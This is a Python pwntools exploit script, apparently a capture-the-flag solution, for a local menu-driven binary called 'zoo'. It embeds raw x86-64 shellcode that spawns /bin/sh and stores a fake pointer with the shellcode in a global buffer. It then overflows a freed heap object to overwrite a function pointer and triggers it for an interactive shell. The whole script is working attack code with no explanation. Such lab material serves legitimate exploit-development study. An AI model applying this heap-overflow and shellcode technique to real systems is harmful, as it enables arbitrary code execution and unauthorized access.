#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./zoo')

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def add_dog(name,weight):
    io.recvuntil(":")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(name)
    io.recvuntil(":")
    io.sendline(str(weight))

def remove_ani(idx):
    io.recvuntil(":")
    io.sendline("5")
    io.recvuntil(":")
    io.sendline(str(idx))


name = 0x605420
ptr = name+16
io.recvuntil(":")
io.sendline('a'*16+p64(ptr)+sc) # write the evil ptr and the shellcode 
#gdb.attach(io)

add_dog("a"*8,0)
add_dog("b"*8,1)
remove_ani(0)

add_dog("a"*72 + p64(ptr),2) # overlap 
#gdb.attach(io)

# listen
io.recvuntil(":")
io.sendline("3")
io.recvuntil(":")
io.sendline("0")

io.interactive()
